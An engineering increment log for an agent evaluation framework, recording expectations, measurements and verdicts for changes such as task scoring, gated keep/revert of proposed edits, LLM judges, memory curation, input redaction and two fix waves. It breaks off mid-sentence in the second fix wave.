# Improve loop — increment log

Append-only. Expectation stated BEFORE the work, measurement after, verdict
last. Rubric: `docs/research/self-learning-rubric.md`. Worklist:
`IMPROVE_LOOP.md`.

---

## I1 — Task metric (2026-09-03)

**Branch:** `improve/i1-task-metric`, off `main` (`2c3fc4b`).
**Rubric claim:** dimension 1, up to +7. Total before: 50.

**Reproduce (RUN, before any change).** The corpus score was
`task_completion`, which `RuleBasedEvaluator` sets to 1.0 whenever the plan
finished with no errors. A graph that ran cleanly and wrote the wrong answer
scored 1.0. `tests/harness/test_task_checks.py::
test_without_checks_a_clean_wrong_answer_scores_full_marks` pins this and is
kept as the control: without an owner claim about the answer, scoring lower
would invent one.

**Expectation.** Owner-declared, data-only `checks` on a scenario (dotted
path into final state; `equals`/`contains`/`regex`/`exists`) and a
runner-measured `budget_ms`; one `score_scenario()` used by both the
in-process runner and the isolated gate path so they cannot drift; `aef loop
score` printing the scalar per split with n, stdev, CI95, and — under
`--repeat` — the spread of the mean across identical runs. Expected: the
demo corpus scores deterministically (spread 0), and a planted
clean-run-wrong-content fault moves the score on exactly the checked
scenarios and nowhere else.

**Measurement.**

```
aef loop score agents.demo.graph:build_graph --corpus corpus --repeat 3
  train       n=6   with_checks=3   mean=0.5000 stdev=0.5477 ci95=[0.0617, 0.9383] repeat_spread=0.000000
  validation  n=5   with_checks=2   mean=0.4000 stdev=0.5477 ci95=[-0.0801, 0.8801] repeat_spread=0.000000

planted: agents/demo success path writes scores.quality=0.0 (clean run, wrong content)
  train       mean=0.1667   boundary-3 1.0->0.0, easy-1 1.0->0.5, easy-2 1.0->0.5, others unchanged
  validation  mean=0.1000   val-boundary 1.0->0.0, val-easy 1.0->0.5, others unchanged
reverted; diff -q against backup: identical

mutations on score_scenario (each -> test fails, reverted):
  M8  ignore the check fraction        3 failed
  M9  ignore the wall-clock budget     1 failed
  M10 let checks override an error     1 failed

pytest -q          1638 passed (from 1618; +20, none removed)
mypy aef examples  122 files clean
ruff check / format --check   clean
```

**What the numbers say.** The CI at n=6 is [0.06, 0.94] — the docstring in
`evaluation.py` was right that means have no power at this size, and the
number that matters for an increment is `repeat_spread`, which is 0 for a
deterministic graph under a pinned clock. Any claimed improvement must
exceed 0 here; on a graph with a non-deterministic node it will be larger,
and `--repeat` is how it gets stated rather than assumed.

**Verdict.** Metric exists, is read by one function in both scoring paths,
can fail without an error, and moves on a planted content fault. Dimension 1:
8 → **13** (not the +7 claimed: a fixed suite with a scalar and a budget is
done; keep/revert on the metric is I2, and the corpus is still 11 demo
scenarios — the checks are only as good as the owner's claims, and there are
five). Total: **50 → 55**.

**Deliberately left.** Checks on the `hard-*` and `tripwire-*` scenarios:
they are `must_fail`-shaped and fail by error today; a check would restate
that. `Expected.MUST_PASS` on the checked ones: `expected` and `checks` say
different things (a claim about the task vs. a claim about the answer) and
conflating them is a separate decision. ADR 0113 records both.

---

## I2 — Keep/revert on the metric, inside the gates (2026-09-03)

**Branch:** `improve/i2-keep-revert`, off `main` (`346da37`).
**Rubric claim:** dimension 1, up to +5. Total before: 55.

**Reproduce (RUN).** `cycle()` proposes from `base_ref` every time and an
accepted candidate (every gate passed → `ESCALATE`, Tier-1 off) goes nowhere;
`test_successive_cycles_do_not_compound` pins it. autoresearch's result came
from stacking kept changes; this loop could not stack anything.

**Expectation.** `run_loop`: N turns / wall-clock budget; each turn proposes
from a local `loop/kept` branch; every-gate-passed advances that branch
(guarded `update-ref`, `KEPT` ledger event); rejection leaves it; `main`
never moves (asserted); stops on turns, budget, halt, no candidate, or a
candidate tree already rejected this run. Expected through the REAL cycle:
turn 1 keeps the structural retry, later turns propose from the kept state.

**Measurement.**

```
real cycle + real gates (flaky-agent fixture, tests/harness/test_structural_acceptance.py):
  turn 1  proposed structural retry from memory   -> every gate passed -> KEPT   loop/kept advanced
  turn 2  proposed numeric tweak FROM kept state   -> G3 rejected      -> reverted
  turn 3  re-proposed the identical tree           -> driver stopped: "already rejected in this run"
  kept 1, reverted 1; main unchanged; ledger: KEPT present, MERGED absent

driver (fake cycle, 9 tests): keep advances / revert holds / stack / AUTO_MERGE still not main /
  budget stop / no-candidate stop / halt stop / repeated-tree stop / second run resumes from kept

mutations on run_loop (each -> tests fail, reverted):
  M11 never advance kept                3 failed
  M12 propose from main, not kept       2 failed
  M13 ignore the repeated rejected tree 1 failed
  M14 ignore the wall-clock budget      1 failed

pytest -q          1648 passed (from 1638; +10, none removed)
mypy aef examples  122 files clean
ruff check / format   clean
```

**Verdict.** The loop stacks, is bounded five ways, and cannot reach main.
Dimension 1: 13 → **17**. Total: **55 → 59**. The last three points are
the material: eleven demo scenarios and a proposer that knows numeric
constants and one structural transformation.

**Deliberately left.** No `aef loop run` invocation on this repo's own
corpus in the log: it needs a blessed baseline and a failure-memory store,
which the fixture provides and the repo's checkout does not. The metric
trajectory per turn is in the ledger's `GATED` evidence, not yet surfaced
by `run_loop`'s summary.

---

## I3 — LLM critic and judge on the harness login (2026-09-03)

**Branch:** `improve/i3-llm-reflection`, off `main` (`e403b84`).
**Rubric claim:** dimension 3, up to +5. Total before: 59.

**Reproduce (RUN).** `Critic.critique` / `Judge.judge` raised
`NotImplementedError` (ADR 0046 deferred them for want of a reachable
model). `agent_services()` could only construct the rule-based pair.

**Expectation.** `LLMCritic`/`LLMJudge` on `ModelProvider` (no vendor SDK):
model writes prose, code computes citations, weighted score, omission=0,
clamping, and a position-swap control with the delta exposed. Fallback to
rule-based on any failure. Reachable via `reflection: {impl: llm}`, refused
at construction without a provider. Expected on the demo corpus: parity with
the rule-based judge (the corpus is trivial), non-zero cost, off by default.

**Measurement.**

```
live A/B, impl claude_code, claude-fable-5-1, 11 corpus states, judge position-swapped (22 calls):
  id                          truth  rule  llm   position_delta  secs
  boundary-3 / easy-1 / easy-2 / val-boundary / val-easy     1.0  1.0  1.0  0.0  9-13
  hard-both-4/5, val-hard-4/5, tripwire-impossible-{train,val} 0.0  0.0  0.0  0.0  9-10
  llm_agreement_with_truth 11/11   rule_agreement_with_truth 11/11
  llm_mae 0.0   rule_mae 0.0   mean_position_delta 0.0   fallbacks 0
  mean 10.1 s / judgment, 118.6 s total
  critic on hard-both-5: grounded_in=["errors[0]"] (computed); prose: "... Likely cause: fixed
    budget/threshold settings mismatched to task class 'hard-both' ..."

mutations (each -> a test fails, reverted):
  M15 omitted term counts 1.0     1 failed
  M16 no clamping                 1 failed
  M17 critic drops citations      1 failed
  M18 no position swap            1 failed

pytest -q          1665 passed (from 1648; +17, none removed)
mypy aef examples  123 files clean
ruff check / format   clean
```

**Verdict.** Implemented, bias-controlled, measured: parity with rule-based
on this corpus at ~10 s per judgment, so **off by default**. The visible
gain is the critic's causal prose, which nothing downstream reads yet.
Dimension 3: 3 → **7**. Total: **59 → 63**.

**Deliberately left.** Self-preference control — nothing here compares model
outputs. A harder corpus where the judges disagree, which is what would
justify turning this on.

---

## I4 — Curation: demote, never delete (2026-09-03)

**Branch:** `improve/i4-curation`, off `main` (`f167bd7`).
**Rubric claim:** dimension 2, up to +6. Total before: 63.

**Reproduce (RUN).** Under a tight budget, entries for resolved failures and
live ones matched the query equally; which got in was an id tie-break
(`test_curation_buys_live_coverage_under_a_tight_budget`, arm hl=0: 2 of 3
live lessons at budget 400). No curation signal existed.

**Expectation.** `runs_since_last_seen` computed per consolidation from
records (a field, not content — rendering costs budget); retriever demotes by
`hl/(hl+runs_since)`, deletes nothing; default set by a sweep. Metric fixed
first: live-lesson coverage. Predicted hl=0 → 1 of 3.

**Measurement.**

```
first attempt put runs_since into content: ADR 0110 coverage A/B fell 6 -> 5 at budget 400
  -> moved to a KnowledgeEntry field; A/B back to 6; field costs no budget (asserted)

live coverage of 3, budget 400, R=3, Q=4:    hl=0 -> 2   hl=2 -> 3   hl=5 -> 3   hl=10 -> 3
total coverage of 6, budget 2000:            6 at every hl
control (Q=0):                               identical coverage every budget; tie-break now recency
runs_since (R=2,Q=3):                        resolved fetch/parse/auth 23/22/21; live settle/notify/reconcile 2/1/0
ADR 0110 coverage A/B with default hl=5:     8 passed, unchanged

predictions wrong, recorded: hl=0 measured 2 not 1; control gave identical coverage, not identical order

mutations (each -> tests fail, reverted):
  M19 count the entry's own run as later   1 failed
  M20 never compute staleness              4 failed
  M21 retriever ignores freshness          3 failed

pytest -q          1672 passed (from 1665; +7, none removed)
mypy aef examples  123 files clean
ruff check / format   clean
```

**Verdict.** Curation exists, is measured, wins by one live lesson at the
tight budget and costs nothing at the generous one; default on at 5.
Dimension 2: 8 → **12**. Total: **63 → 67**.

**Deliberately left.** The ACE signal proper (retrieved → outcome) — no node
writes `retrieved_context`, so nothing can produce it. Curation of lesson
*text* — entries remain the latest occurrence's verbatim feedback.

---

## I7 — Skills are proposed, never installed (2026-09-03)

**Branch:** `improve/i7-skill-proposals`, off `main` (`78509e5`).
**Rubric claim:** dimension 2, up to +4. Total before: 67.

**Reproduce (RUN).** No path existed from a `KnowledgeEntry` to anything a
person could adopt as a skill; WikiSkill's third layer was declared out of
scope wholesale (ADR 0110) because its runtime updater is constraint #7.

**Expectation.** `aef loop skills`: one `SKILL.md` draft per entry with ≥3
occurrences, under a caller-named proposals dir; refuses `.claude/`,
`.cursor/`, `.github/`, `agents/`; never overwrites; every field computed
from the entry; no import of evolution/providers/reasoning.

**Measurement.**

```
tests: 11 (provenance, slug, one-per-entry, no-overwrite, 4x harness-dir refusal, agent scope,
        AST import check, CLI end-to-end incl. refusal as exit code)
mutations (each -> tests fail, reverted):
  M22 write under harness dirs      5 failed
  M23 overwrite existing drafts     1 failed
  M24 ignore agent scope            1 failed
pytest -q          1683 passed (from 1672; +11, none removed)
mypy aef examples  124 files clean
ruff check / format   clean
```

**Verdict.** Governed output for the skill layer. Dimension 2: 12 → **15**.
Total: **67 → 70**.

**Deliberately left.** Whether an adopted skill helps — needs a person to
adopt one and the task metric to move. A file-backed knowledge store (the
drafts are recomputed from the memory file each run, which is correct but
means `--memory` is the only input).

---

## I9 — The retriever gets a caller; lessons get an outcome; A1 closed (2026-09-03)

**Branch:** `improve/i9-retrieve-node`, off `main` (`47754fe`).
**Rubric claim:** dimension 2, up to +3 (added mid-run: the producer ADR 0116 said was missing). Total before: 70.

**Reproduce (RUN).** No node called `Services.retriever`; `context_budget_tokens`
governed nothing in a real run; `retrieved_context` was never written, so ACE's
retrieved→outcome signal had no producer. Separately (A1): `build_retriever` took
no `knowledge=`, so a configured run's retriever could never see a lesson.

**Expectation.** `make_retrieve_node` writes chunks within the state's budget;
reflect records `retrieved_signatures`; consolidator tallies helpful/harmful
per entry, agent-scoped, recomputed; surfaced in chunk metadata and skill
drafts; NOT a ranking input (on current rigs "harmful" and "live" coincide).

**Measurement.**

```
end-to-end (retrieve -> work -> reflect -> consolidate): context on state within budget;
  budget=1 retrieves nothing; unconfigured retriever refuses by name;
  2 failures then (fail, fail, succeed) with the lesson in context -> helpful 1, harmful 2,
  same numbers in chunk metadata and the skill draft; another agent's run does not count.

parity test failed on the new require_retriever (gate vs run drift, the 5th ADR 0091 instance)
  -> agent_services now defaults a retriever over its own throwaway stores; ADR 0101's
     "no default" control test rewritten deliberately; A1 closed (build_retriever knowledge=).

mutations (each -> tests fail, reverted):
  M25 retrieve ignores the state budget    1 failed
  M26 reflect drops the signatures         3 failed
  M27 helpful/harmful swapped              1 failed
  M28 tally not agent-scoped               NOT DETECTED at first — the consolidator's own
      agent_id query filter hid it; test rewritten to consolidate across agents -> 1 failed

pytest -q          1691 passed (from 1683; +8, none removed)
mypy aef examples  124 files clean
ruff check / format   clean
```

**Verdict.** The ACE loop closes (generate → reflect → curate) with the
ranking input measured-but-unused. Dimension 2: 15 → **17**. Total: **70 → 72**.
Also closes MERGE_READY_LOOP Track A1.

**Deliberately left.** Ranking on helpful/harmful — needs a rig where a lesson
is harmful and NOT live. `examples/hello_agent` has no retrieve node yet.

---

## I5 — Redact the input, then re-execute (2026-09-03)

**Branch:** `improve/i5-redaction`, off `main` (`1b74c65`).
**Rubric claim:** dimension 7, up to +5. Total before: 72.

**Reproduce (RUN).** `harvest` wrote a real run's objective and working memory
into a corpus that lives in git, verbatim. The control test
(`test_redaction_off_is_explicit_and_writes_the_raw_run`) shows a planted
email reaching disk with the policy off.

**Expectation.** `RedactionPolicy` (emails, API keys, bearer, AWS keys, long
opaque strings; secret-shaped working-memory keys dropped); harvest redacts
the INPUT, re-executes, admits only if node path / failing nodes / plan status
are unchanged, scans the output scenario before writing; on by default.

**Measurement.**

```
planted email in objective + token in working_memory -> promoted; neither in any corpus file;
  stored trace is the re-executed one; notes: "2 redaction(s) applied"
graph that fails only when the token is present -> rejected_redaction_changed_behaviour, nothing written
graph that emits the token from its own code   -> rejected_unredactable (output scan), nothing written
redaction=None                                  -> email reaches disk (the control for the scan)
every default pattern matched by a sample; ordinary text untouched

mutations (each -> tests fail, reverted):
  M29 no output scan                 1 failed
  M30 behaviour change not checked   1 failed
  M31 secret keys not dropped        2 failed
  M32 keep the unredacted trace      1 failed

pytest -q          1701 passed (from 1691; +10, none removed)
mypy aef examples  125 files clean
ruff check / format   clean
```

**Verdict.** Real-signal ingestion is safe to point at a tenant. It has not
been pointed at one. Dimension 7: 2 → **5**. Total: **72 → 75**.

**Deliberately left.** The remaining five points of dimension 7 are the
owner decision the trust case names (live traffic, a real tenant), not code.

---

## I8 — The prompt surface is under test (2026-09-03)

**Branch:** `improve/i8-prompt-surface`, off `main` (`1bf4413`).
**Rubric claim:** dimension 5, up to +1. Total before: 75.

**Reproduce (RUN).** Nothing checked the prompt surface after `/new-model-check`
edited it; a commit could reintroduce removed text or trim added blocks and
no test would fail.

**Expectation.** A regression check over this repo's instruction files and
the adopt renderers: required blocks present (joined blockquotes), removed
patterns absent, verification instructions kept, every detector proved
against a planted fault first.

**Measurement.**

```
planted-fault test caught a broken detector: anti-formatting regex was case-sensitive
verification check found a real gap: adopt's shipped CLAUDE.md had no reproduce-first line
  -> "How work is verified here" section added to render_claude_md (and a line to AGENT_INTEGRATION.md)
mutations (each -> tests fail, reverted):
  M33 autonomy block's first sentence trimmed   2 failed
  M34 "Do not narrate your steps." appended     2 failed
pytest -q          1714 passed (from 1701; +13, none removed)
mypy aef examples  125 files clean
ruff check / format   clean
```

**Verdict.** Prompt edits have a check that fails on regression. A lint, not
an eval. Dimension 5: 9 → **10**. Total: **75 → 76**.

---

## I6 — An archive, not a ladder (2026-09-03)

**Branch:** `improve/i6-archive`, off `main` (`d1f3c55`).
**Rubric claim:** dimension 6, up to +4. Total before: 76.

**Reproduce (RUN).** `run_loop` proposed every turn from the latest kept
state and kept no lineage; a candidate that scored below the leader could
never be built on (`test_greedy_mode_is_unchanged_by_the_archive` pins the
ladder as the default).

**Expectation.** G3 scores surfaced through GateRun/CycleRun; an archive of
kept members with score, parent, children; `sample_parents` by
sigmoid(score)/(1+children) with a seeded RNG; kept branch = best member;
duplicates of kept trees skipped, not reverted. Measured on the real cycle:
expected NO diversity gain, because the proposer is deterministic.

**Measurement.**

```
real cycle, flaky fixture, 4 turns, greedy vs sampled (seed 0):
  greedy   kept 1  distinct trees 1  (turn 2 numeric tweak rejected, turn 3 repeat -> stop)
  sampled  kept 1  distinct trees 1  (root re-drawn -> duplicate of the kept tree -> skipped)
  G3 candidate mean reached the archive; main unchanged in both

driver (fake scored cycle): greedy unchanged; lineage + best-score kept branch; non-greedy
  parent observed under seed 3 (as a duplicate); duplicates neither kept nor reverted

mutations (each -> tests fail, reverted):
  M35 sampling silently greedy            1 failed
  M36 kept branch not the best member     1 failed
  M37 duplicates treated as new           1 failed
  M38 novelty term dropped                NOT DETECTED -> direct _parent_weight test added -> 1 failed

pytest -q          1720 passed (from 1714; +6, none removed)
mypy aef examples  125 files clean
ruff check / format   clean
```

**Verdict.** Archive, lineage, sampling and duplicate handling exist and are
tested; measured diversity gain on this proposer is zero, so the knob is off.
Dimension 6: 3 → **6**. Total: **76 → 79**.

**Deliberately left.** A proposer with a wider repertoire, which is what
would give the archive something to sample. Fourth test-side hole in six
increments (M38), recorded.

---

## I10 — A proposer with a repertoire (2026-09-03)

**Branch:** `improve/i10-llm-proposer`, off `main` (`34abe7d`).
**Rubric claim:** dimension 6, up to +3; dimension 1, up to +1. Total before: 79.

**Reproduce (RUN).** `.scratch/i10_reproduce.py` on the flaky fixture: from the
root `RuleBasedProposer` emits one candidate (the structural retry), from the
kept state one other (a numeric step); identical across three calls; **two
reachable trees in total**. ADR 0121's archive sampled a proposer with one idea.

**Expectation.** `LLMProposer(provider, model)` with the rule-based `Proposal`
contract; citations computed from `MemoryEvidence` through `_check_citations`
(validation/holdout refused before any call); whole file in one fenced block,
validated in code against G0's line budget and IMPORTED allowlist, G4's
owner-only fields, parse, same path, non-empty diff; any failure → rule-based
with the reason in the rationale; `LoopConfig.proposer`, `--proposer llm`; off
by default. Expected live: LLM keeps ≥ rule-based on both fixtures and
**distinct kept trees > 1 on at least one** — the second half was wrong.

**Measurement.**

```
live, ClaudeCodeProvider(claude-fable-5-1), run_loop 4 turns, real six-gate pipeline, 2 LLM reps:
  flaky  rule_based  kept 1  distinct 1  gates 1/3  calls 0   stopped: re-proposed a rejected tree (turn 3)
  flaky  llm rep 0   kept 1  distinct 1  gates 1/4  calls 4   t1 PASS (28-line in-node retry) t2,t3 G3  t4 G5 drift 0.538
  flaky  llm rep 1   kept 1  distinct 1  gates 1/4  calls 4   t1 PASS t2 G3 t3 G5 0.542 t4 G5 0.506 -> HALTED (criterion 3)
  demo   rule_based  kept 0  distinct 0  gates 0/2  calls 0   single-constant step never beats the cohort
  demo   llm rep 0   kept 1  distinct 1  gates 1/4  calls 4   t1 PASS (RETRY_BUDGET + QUALITY_THRESHOLD 3->9 together) t2-4 G3
  demo   llm rep 1   kept 1  distinct 1  gates 1/4  calls 4   t1 PASS (same, 4 lines) t2-4 G3
  replies validated 16/16, fallbacks 0, distinct candidates per LLM run 4/4, ~100 s per call
  calls made: 26 of 40 (1 smoke, 9 under the defective driver below — discarded, 16 measured)

defect found by the first live run (every arm, every turn >= 2 rejected by G1 "gate raised
  TrustBoundaryError: scratch destination .../work/workspace must be empty"): run_loop reused one
  workdir per run and G1 refuses a non-empty scratch dir -> no real run_loop had ever gated a
  second candidate behaviourally; I2's and I6's "turn 2 rejected" were this. Fixed: a scratch dir
  per turn; acceptance test now asserts every gated candidate ran G3 and no gate raised.

mutations (each -> tests fail, reverted, restored byte-for-byte):
  M39 validation citations not refused        1 failed
  M40 unparseable reply accepted              1 failed
  M41 path outside Zone A accepted            1 failed
  M42 provider error not caught               1 failed
  M43 G0 scan of the reply dropped            1 failed
  M44 G4 owner-only check dropped             1 failed
  M45 line budget dropped                     1 failed
  M46 config.proposer ignored                 1 failed
  M47 computed citations dropped from rationale 1 failed
  M48 shared workdir reinstated               2 failed

pytest -q          1759 passed (from 1720; +39, none removed)
mypy aef examples  126 files clean
ruff check / format   clean
```

**Verdict.** The repertoire exists and is measured: four distinct, gate-legal
candidates per run, none a repeat, none a fallback; on the agent the
catalogue cannot reach the loop keeps a candidate it never could. Kept
diversity did not move (1 everywhere — after one kept change the gates
reject the rest), the LLM arm is the only one that halted the loop, and the
flaky result is a tie at 100 s a turn versus 0 — so the knob is **off by
default** and `--proposer llm` is the owner's call. Dimension 6: 6 → **8**.
Dimension 1: 17 → **18**. Total: **79 → 82**.

**Deliberately left.** Whether G5's drift budget (sized for two-line diffs)
is the right budget for a proposer that writes twenty — an owner decision,
not a threshold to raise. A rig where kept diversity can exceed 1 (needs an
agent with more than one independent repairable failure). The harness
chatter that leaked once into the model's prose is capped, not filtered.

---

## I11 — A task a model can fail, replayed without a key (2026-09-03)

**Branch:** `improve/i11-task-suite`, off `main` (`34abe7d`).
**Rubric claim:** dimension 1, up to +3; dimension 3, up to +2. Total before: 79.

**Reproduce (RUN).** `aef loop score agents.demo.graph:build_graph --corpus
corpus`: 11 scenarios, 6 below 1.0, all 6 carrying an error — no scenario
fails on content alone (`.scratch/reproduce.py`). A graph that calls a model
could not be recorded and replayed: nothing pinned the model the way
`fixed_clock` pins the clock.

**Expectation.** `CassetteProvider` keyed on (messages, model, max_tokens);
`Scenario.model_calls` with payload round-trip; miss FAILS by default,
`cassette_miss="live"` opt-in reported as live; cassette shipped to the
isolated worker; `agents/summary` recorded twenty times live with owner
checks; cassette score deterministic (spread 0); a planted prompt regression
moves the score; judge A/B on the content corpus — predicted BEFORE running
that neither judge reads the answer.

**Measurement.**

```
recording: 20 scenarios, 20 model calls (claude_code, claude-fable-5-1), 4.9-9.8 s each
  12 train / 6 validation / 2 holdout (--i-am-spending-the-holdout, once)

cassette, --repeat 3 (54 hits, 0 misses, 0 live calls):
  train       n=12 mean 0.9792 stdev 0.0722 ci95 [0.9383, 1.0200] repeat_spread 0.000000
  validation  n=6  mean 0.9167 stdev 0.1291 ci95 [0.8134, 1.0200] repeat_spread 0.000000
  0.75 x3 (sum-07, sum-14, sum-16): required term capitalised at sentence start; `contains`
    is case-sensitive -> the first content failures the metric has seen

planted regression (must-mention instruction dropped), default cassette_miss=fail:
  36 misses, 0 hits, train 0.0000 validation 0.0000, 0 live calls, spread 0
  reverted; diff vs backup and vs HEAD both clean
planted regression, cassette_miss=live, --repeat 3: DID NOT COMPLETE
  attempt 1 train+val (54 calls) killed at 10-min wall; attempt 2 val x3 (18) killed with
  background tasks; attempt 3 val x3 foreground > 10 min. Predicted ~6 min at ~6 s/call —
  WRONG. Live noise floor: absent. Calls spent: unknown exactly, <= 90 across attempts.

judge A/B, 18 states, position-swapped, 36 calls, mean 11.9 s / judgment:
  rule_agreement_with_checks 3/18   llm_agreement_with_checks 9/18   rule-vs-llm disagree 10/18
  llm scores 0.23-0.50, position_delta 0.05-0.2 on 9/18, fallbacks 0
  prediction confirmed: neither judge's evidence contains the summary

mutations (each performed: perturb, run, restore, diff-clean):
  M39 miss under 'fail' falls through to live   1 failed
  M40 a hit still calls the inner provider      1 failed
  M41 model_calls not loaded from the payload   1 failed
  M42 a `contains` check always holds           1 failed

found on the way: worker PYTHONPATH carried only the workspace -> parent/worker protocol
  drift on a checkout whose venv resolves `aef` elsewhere; harness root now appended (fixed)
reported, not fixed: gates do not filter by graph_id; harvest re-executes without a cassette;
  judge evidence omits working_memory

pytest -q          1744 passed (from 1720; +24; two corpus-pinning tests rewritten deliberately)
mypy aef examples  126 files clean
ruff check / format   clean
```

**Verdict.** The corpus has a task a model can fail, replayed deterministically
with no credential, and a prompt regression is caught by the default policy
without a live call. Dimension 1: 17 → **19** (the live noise floor is
unmeasured; no turn has been kept or reverted on this suite). Dimension 3:
7 → **8** (the corpus where the judges disagree exists; what it shows is that
neither sees the answer). Total: **79 → 82**.

**Deliberately left.** The live noise floor (a measurement, not code — retry
when the harness answers at recording speed again). A judge whose evidence
includes the answer. Case-insensitive term checks, or `(?i)` regexes, for
the next recording. Filtering gate scenarios by `graph_id`.

---

## Fix wave B — six seams, and a judge that could not read the answer (2026-09-03)

**Branch:** `fix/seams-b`, off `main` (`705543d`).
**Rubric claim:** none. A fix wave measures no new capability; two of the six
findings are disclosures with numbers and no code.

**Reproduce (RUN).** Every finding was reproduced before anything changed,
from the seam-hunter's scripts copied into `.scratch/`:

```
F5  .scratch/repro_tally.py 4a/4b
      success:<objective>  occ 4  helpful 0  harmful 2   (four clean runs)
      failure:fetch        occ 2  helpful 1  harmful 0   (run failed fetch>parse)
F6  .scratch/repro_provider.py + `claude --help` (2.1.260)
      argv carried no MCP or settings isolation; max_tokens=400 absent from argv
      seam-hunter measured 211,470 input tokens/call ($0.18 cached, $2.22 uncached)
      vs 4,684 with --strict-mcp-config --mcp-config {}
F9  .scratch/repro_prompt_filter.py
      3 of 4 planted faults invisible to the surface test's own filter
F10 .scratch/repro_redaction.py
      "migrate-the-customer-billing-pipeline-to-v2-with-zero-downtime"
      -> [REDACTED:opaque_secret], scenario admitted with a placeholder objective
F8  .scratch/repro_tally.py 5
      occ 6 harmful 4  ->  occ 6 harmful 2 at candidates_per_kind=2 (same store)
F12 a graph whose node calls the provider, harvested
      promoted () / rejected_nondeterministic ("m1",)
F13 (I11 reported it) judge evidence contains no working_memory: rule 3/18,
      LLM 9/18 agreement with the owner's checks on the summary corpus
```

**Expectation.** Stated before fixing: the tally must count only failures and
must treat a chained failure as a recurrence; the provider argv must isolate
the session without dropping the keychain; the surface filter must blank code
spans and nothing else; `opaque_secret` must need a letter, a numeral and no
hyphen; harvest must re-execute under a cassette; the judges must see the
answer. Predicted that no current prompt surface would fail the stricter
filter — confirmed, so no prompt file needed editing.

**Measurement (after).**

```
F5  success:<objective>  occ 4  helpful 0  harmful 0
    failure:fetch        occ 2  helpful 0  harmful 1
F6  claude -p ... --tools "" --strict-mcp-config --mcp-config {} --safe-mode ...
    --bare still absent; max_tokens documented as dropped (no CLI flag exists)
    NOT re-measured live: the claude-fable-5-1 quota was exhausted. Flag names
    confirmed from `claude --help`; --safe-mode is "CLAUDE.md, skills, plugins,
    hooks, MCP servers ... disabled ... auth ... work normally", the only
    documented flag that drops memory files without dropping the login.
F9  all four planted faults visible through the filter; 0 surface files trip it
F10 slug -> () ; "v2-migrate-...-downtime" -> () ; long snake_case ident -> ()
    44-char mixed token -> ("opaque_secret",) ; base64 payload -> same
F12 promoted ("m1",), live provider called exactly once (the recording)
    found on the way: the output scan read RecordedCall.key (a SHA-256 the
    harness computes) as an opaque_secret, so EVERY model-calling run was
    rejected "a secret survived redaction" — all 20 ADR 0123 scenarios match
    it. Digest dropped from the scan; a secret in the model's reply still fails.
F13 judge prompt now carries `working_memory[summary]: <answer>`, capped at
    MAX_ANSWER_CHARS=600 (vs 160), at most 4 entries, total item cap unchanged.
    Live A/B NOT re-run (quota) — 3/18 and 9/18 stand as the measurement of the
    defect, not of the fix.

mutations (each: perturb, run, fail, revert, diff clean)
  M1  success entries tallied again                    1 failed
  M2  reproduction by string equality                  2 failed
  M3  subsequence weakened to a set subset             1 failed
  M4  isolation flags removed from the argv            1 failed
  M5  --mcp-config points at the operator's config     1 failed
  M6  the old guide/remove line filter restored        1 failed
  M7  any line containing a backtick dropped whole     1 failed
  M8  the shape-only opaque_secret restored            1 failed
  M9  hyphens allowed back into the character class    1 failed
  M10 the letter+numeral requirement dropped           1 failed
  M11 harvest re-executes with an empty cassette       3 failed
  M12 model_calls not loaded from the payload          4 failed
  M13 the output scan reads the digest as tenant text  2 failed
  M14 working_memory left out of the evidence          3 failed
  M15 the answer excerpt uncapped                      1 failed
  M16 no inner cap on working_memory items             1 failed

pytest -q          1800 passed (from 1744; +56)
mypy aef examples  127 files clean
ruff check / format   clean
model calls made: 0 (quota exhausted; `claude --help` and `--version` only)
```

**Verdict.** Six findings reproduced and five fixed in code, one documented.
No rubric dimension moves: a fix wave restores what the numbers already
claimed rather than claiming more. Two of the loop's own past numbers are now
known to be measurements of defects — ADR 0123's judge A/B (neither judge read
the answer) and ADR 0115's cost-in-seconds (which omitted a 211,470-token
input) — and both errata say so at the source.

**Deliberately left.** The live re-measurement of the provider's per-call
cost and of the judge A/B with the answer in evidence — both need quota. The
recording half of F12: `aef/cli/run.py` belongs to another worker this wave,
so `RecordedRun(..., model_calls=recording.recorded)` and the recording
cassette around the configured provider are specified in ADR 0126's
Consequences for the orchestrator to wire. `_merge`'s window/provenance
mismatch (F8) is disclosed in ADR 0116, not patched: carrying tallies forward
is the second source of truth ADR 0091 forbids. One flake, seen once and not
reproduced twice: `test_closing_the_session_leaves_no_container_running`
compares host-wide container state and fails if anything else on the machine
starts one.

---

## Fix wave A — the seams the assembled paths left open (2026-09-03)

**Branch:** `fix/seams-a`, off `main` (`705543d`).
**Rubric claim:** none. No score moves; one dimension's *evidence* becomes true.

**Reproduce (RUN, before any change).** Six findings from the post-merge
seam-hunter, every one reproduced by executing an assembled path, none by
reading it. Scripts kept in `.scratch/`; commands and numbers in ADR 0125.

```
F1  run_graph_module x3 with --memory, retrieve->work(fails)->reflect->consolidate:
      retrieved_signatures [] , [] , []      no knowledge chunk in any run
F2  same script, run 0 retrieved 'memory:failure:d9d484cb…' = OTHER-TENANT's record
F3  4-node graph, last node asks services.policy_engine, PolicyConfig{net.read}
      given to BOTH runners:  in-process 1.0 / isolated 0.0
F4  same script, 3 runs each:  in-process 0.082 / 0.119 / 0.125 ms
                               isolated   0.715 / 0.767 / 0.790 ms
      budget_ms = 5x in-process (0.417): in-process 1.0, isolated 0.0
F7  run_loop with HEAD = loop/kept:  git status --porcelain 'M  agents/demo/graph.py'
      HEAD commit RETRY_BUDGET = 4, worktree file = 3  (a staged reversal)
F11 corpus of 2 demo_agent + 3 summary_agent scenarios, CohortBuilder spied:
      graph_id='demo_agent' -> cohort saw all five
      graph_id='default'    -> cohort saw all five
suspected (verified): one aef.yaml with tools.allow [net.read]
      aef loop score --config  0.0000   |  run_scenario(sc, graph, POL)  1.0
      aef run --config         allow, no errors
```

Two were **pre-existing**, not from the I10/I11 wave: F3 since ADR 0094 moved
node bodies into a worker; the `loop score` policy gap since ADR 0113 added
the command.

**Expectation.** Five of the six are one shape — a component that is correct,
tested, and never handed what it needs by the thing that assembles it. Stated
before fixing: F3 would show a *uniform* zero (candidate, incumbent, cohort),
which is why no measurement this program has taken could see it — the demo
agent consults no policy.

**Change.**

```
F1  aef/cli/run.py: RuleBasedConsolidator().consolidate(memory, knowledge,
      agent_id=) at run start when memory_path is given. Recompute, not a
      file-backed store (ADR 0110: stateless by design; a second store is a
      second source of truth, ADR 0091). `aef loop skills` already did this.
F2  aef/cli/run.py passes agent_id= to agent_services; runtime.py's comment
      corrected; erratum appended to ADR 0118 (not a rewrite).
F3  ADR 0123's `configure` frame EXTENDED — never a second channel — with
      policy (scenario_runner.policy_payload / policy_config_from_payload,
